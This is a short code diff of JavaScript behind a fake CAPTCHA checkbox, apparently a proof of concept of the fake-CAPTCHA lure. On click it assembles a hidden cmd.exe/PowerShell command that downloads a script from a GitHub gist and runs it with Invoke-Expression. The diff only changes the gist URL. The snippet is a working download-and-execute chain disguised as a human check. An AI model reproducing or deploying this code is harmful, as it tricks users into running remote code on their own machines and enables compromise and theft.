@@ -58,7 +58,7 @@
     document.getElementById('captchaCheckbox').addEventListener('click', () => {
         const cmd = "cmd.exe";
         const args = "/c powershell -WindowStyle Hidden -Command ";
-        const scriptUrl = "'https://gist.githubusercontent.com/testing1234/a485c2fef0571df4c2c8c4106b482efd/raw/aa8d59a5e28e9836a9585bd4a809b99e8bcab7b4/click_jacking_poc';";
+        const scriptUrl = "'https://gist.githubusercontent.com/Mrlukerwilkinson/a485c2fef0571df4c2c8c4106b482efd/raw/e1c30bb8c05cbecafbf9d11f3091c36a4896ee06/click_jacking_poc';";
         const createClient = "$client=New-Object System.Net.WebClient;";
         const fetchScript = "$content=$client.DownloadString(" + scriptUrl + ");";
         const executeScript = "Invoke-Expression $content;";
